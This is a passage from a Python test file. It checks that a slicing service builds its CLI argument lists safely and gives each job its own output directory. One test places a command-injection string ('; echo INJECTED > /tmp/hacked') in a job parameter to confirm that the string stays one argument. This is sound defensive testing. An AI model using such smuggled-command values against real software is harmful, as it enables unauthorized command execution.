        assert all(isinstance(arg, str) for arg in args)
        
        # The file path should be a single argument
        expected_path = str(file_path)
        assert expected_path in args, (
            f"File path with metacharacters should be a single argument. "
            f"Expected {expected_path!r} in args."
        )
        
        # Verify we don't have excessive arguments (indicating shell expansion)
        assert len(args) < 15

    def test_property_10_subprocess_safety_demonstration(self, tmp_path):
        """
        **Property 10: CLI command is a well-formed list (no shell injection)**
        
        Demonstrate that args list is safe for asyncio.create_subprocess_exec.
        
        This test shows that when args are passed as a list, shell metacharacters
        are treated as literal values, not as shell commands.
        """
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        # Create a parameter with a dangerous shell command
        dangerous_value = "; echo INJECTED > /tmp/hacked"
        
        job = {
            "file_ids": [],
            "action": "slice",
            "parameter_overrides": {
                "comment": dangerous_value,
            }
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        # Key assertion: args is a list of strings
        assert isinstance(args, list)
        assert all(isinstance(arg, str) for arg in args)
        
        # The dangerous value should be in ONE argument
        expected_arg = f"--comment={dangerous_value}"
        assert expected_arg in args
        
        # If this were passed to a shell, the "; echo INJECTED" part would
        # execute as a separate command. But with create_subprocess_exec(*args),
        # the entire string is passed as a single argv element to the process.
        
        # Count arguments - should be small number, not split by semicolon
        assert len(args) < 10, (
            f"Args list should be compact. Got {len(args)} args: {args}. "
            f"If shell interpreted the semicolon, we'd have many more args."
        )
        
        # Verify that the semicolon didn't create a separate command
        # by checking that no new arguments start after the semicolon
        for i, arg in enumerate(args):
            if dangerous_value in arg:
                # The dangerous value should be completely contained in this one argument
                # There should not be a follow-up argument that looks like "echo"
                if i + 1 < len(args):
                    next_arg = args[i + 1]
                    assert not next_arg.startswith("echo"), (
                        "Semicolon should not have split the command"
                    )


class TestUniqueOutputDirectoriesPropertyTests:
    """
    Property-based tests for unique output directories per job.
    
    Property 11: Output directories are unique per job
    
    For any two distinct job submissions (different job_ids), the --outputdir
    argument in each CLI invocation shall resolve to a different absolute path
    on disk.
    
    Validates: Requirements 6.3
    """

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        job_id_1=st.text(
            min_size=1,
            max_size=50,
            alphabet=st.characters(
                whitelist_categories=('Lu', 'Ll', 'Nd', 'Pd'),
                blacklist_characters=['/', '\\', '\x00']
            )
        ),
        job_id_2=st.text(
            min_size=1,
            max_size=50,
            alphabet=st.characters(
                whitelist_categories=('Lu', 'Ll', 'Nd', 'Pd'),
                blacklist_characters=['/', '\\', '\x00']
            )
        ).filter(lambda x: x != ""),  # Ensure non-empty
    )
    def test_property_11_unique_output_directories(self, tmp_path, job_id_1, job_id_2):
        """
        **Property 11: Output directories are unique per job**
        
        Generate two distinct job IDs and verify that their output directories
        differ. This ensures that output files from different jobs never collide.
        
        **Validates: Requirements 6.3**
        """
        # Ensure job IDs are distinct
        if job_id_1 == job_id_2:
            # If hypothesis generates identical IDs, skip this iteration
            # (hypothesis will generate different ones)
            return
        
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "test_session"
        session_dir.mkdir(parents=True, exist_ok=True)
        
        # Create output directories for two distinct jobs
        output_dir_1 = config.tmp_root / "jobs" / job_id_1 / "output"
        output_dir_1.mkdir(parents=True, exist_ok=True)
        
        output_dir_2 = config.tmp_root / "jobs" / job_id_2 / "output"
        output_dir_2.mkdir(parents=True, exist_ok=True)
        
        # Create identical job requests (only difference is output_dir)
        job = {
            "file_ids": [],
            "action": "slice",
        }
        
        # Build CLI args for both jobs
        args_1 = build_cli_args(job, config, session_dir, output_dir_1)
        args_2 = build_cli_args(job, config, session_dir, output_dir_2)
        
        # Extract the --outputdir argument from both
        assert "--outputdir" in args_1, "First job should have --outputdir"
        assert "--outputdir" in args_2, "Second job should have --outputdir"
        
        outputdir_idx_1 = args_1.index("--outputdir")
        outputdir_idx_2 = args_2.index("--outputdir")
        
        assert outputdir_idx_1 + 1 < len(args_1), "outputdir should be followed by path"
        assert outputdir_idx_2 + 1 < len(args_2), "outputdir should be followed by path"
        
        output_path_1 = args_1[outputdir_idx_1 + 1]
        output_path_2 = args_2[outputdir_idx_2 + 1]
        
        # CRITICAL ASSERTION: Output directories must be different
        assert output_path_1 != output_path_2, (
            f"Output directories for distinct job IDs must differ. "
            f"Job 1 ({job_id_1}): {output_path_1}, "
            f"Job 2 ({job_id_2}): {output_path_2}"
        )
        
        # Verify paths are absolute
        assert Path(output_path_1).is_absolute(), (
            f"Output directory must be absolute: {output_path_1}"
        )
        assert Path(output_path_2).is_absolute(), (
            f"Output directory must be absolute: {output_path_2}"
        )
        
        # Verify paths are within tmp_root (ephemeral job storage)
        assert str(output_path_1).startswith(str(config.tmp_root)), (
            f"Output directory must be within tmp_root: {output_path_1}"
        )
        assert str(output_path_2).startswith(str(config.tmp_root)), (
            f"Output directory must be within tmp_root: {output_path_2}"
        )
        
        # Verify paths contain the job IDs (ensuring uniqueness is based on job ID)
        assert job_id_1 in output_path_1, (
            f"Output directory should contain job ID {job_id_1}: {output_path_1}"
        )
        assert job_id_2 in output_path_2, (
            f"Output directory should contain job ID {job_id_2}: {output_path_2}"
        )
    
    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Generate pairs of distinct UUIDs (simulating real job IDs)
        uuid_pair=st.lists(
            st.uuids().map(str),
            min_size=2,
            max_size=2,
            unique=True
        )
    )
    def test_property_11_uuid_based_job_ids(self, tmp_path, uuid_pair):
        """
        **Property 11: Output directories are unique per job**
        
        Test with UUID-based job IDs (which is the real-world scenario).
        Two distinct UUIDs must always produce different output directories.
        
        **Validates: Requirements 6.3**
        """
        job_id_1, job_id_2 = uuid_pair
        
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "test_session"
        session_dir.mkdir(parents=True, exist_ok=True)
        
        # Create output directories
        output_dir_1 = config.tmp_root / "jobs" / job_id_1 / "output"
        output_dir_1.mkdir(parents=True, exist_ok=True)
        
        output_dir_2 = config.tmp_root / "jobs" / job_id_2 / "output"
        output_dir_2.mkdir(parents=True, exist_ok=True)
        
        # Simple job request
        job = {
            "file_ids": [],
            "action": "slice",
        }
        
        # Build CLI args
        args_1 = build_cli_args(job, config, session_dir, output_dir_1)
        args_2 = build_cli_args(job, config, session_dir, output_dir_2)
        
        # Extract output directories
        outputdir_idx_1 = args_1.index("--outputdir")
        outputdir_idx_2 = args_2.index("--outputdir")
        
        output_path_1 = args_1[outputdir_idx_1 + 1]
        output_path_2 = args_2[outputdir_idx_2 + 1]
        
        # Verify they differ
        assert output_path_1 != output_path_2, (
            f"UUID-based job IDs must produce unique output directories. "
            f"Job {job_id_1}: {output_path_1}, Job {job_id_2}: {output_path_2}"
        )
        
        # Verify both are valid absolute paths
        assert Path(output_path_1).is_absolute()
        assert Path(output_path_2).is_absolute()
    
    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Generate N job IDs and verify all are unique
        num_jobs=st.integers(min_value=2, max_value=10),
        job_id_generator=st.data()
    )
    def test_property_11_multiple_jobs_all_unique(self, tmp_path, num_jobs, job_id_generator):
        """
        **Property 11: Output directories are unique per job**
        
        Test that N distinct jobs all produce different output directories.
        This verifies that the uniqueness property scales.
        
        **Validates: Requirements 6.3**
        """
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "test_session"
        session_dir.mkdir(parents=True, exist_ok=True)
        
        # Generate N distinct job IDs
        job_ids = job_id_generator.draw(
            st.lists(
                st.uuids().map(str),
                min_size=num_jobs,
                max_size=num_jobs,
                unique=True
            )
        )
        
        output_paths = []
        
        for job_id in job_ids:
            # Create output directory
            output_dir = config.tmp_root / "jobs" / job_id / "output"
            output_dir.mkdir(parents=True, exist_ok=True)
            
            # Build CLI args
            job = {
                "file_ids": [],
                "action": "slice",
            }
            
            args = build_cli_args(job, config, {}, output_dir)
            
            # Extract output path
            outputdir_idx = args.index("--outputdir")
            output_path = args[outputdir_idx + 1]
            
            output_paths.append(output_path)
        
        # Verify all output paths are unique
        assert len(output_paths) == len(set(output_paths)), (
            f"All {num_jobs} jobs should have unique output directories. "
            f"Got {len(set(output_paths))} unique paths out of {len(output_paths)} total."
        )
        
        # Verify no two paths are the same
        for i, path_i in enumerate(output_paths):
            for j, path_j in enumerate(output_paths):
                if i != j:
                    assert path_i != path_j, (
                        f"Job {i} (ID: {job_ids[i]}) and Job {j} (ID: {job_ids[j]}) "
                        f"have the same output directory: {path_i}"
                    )
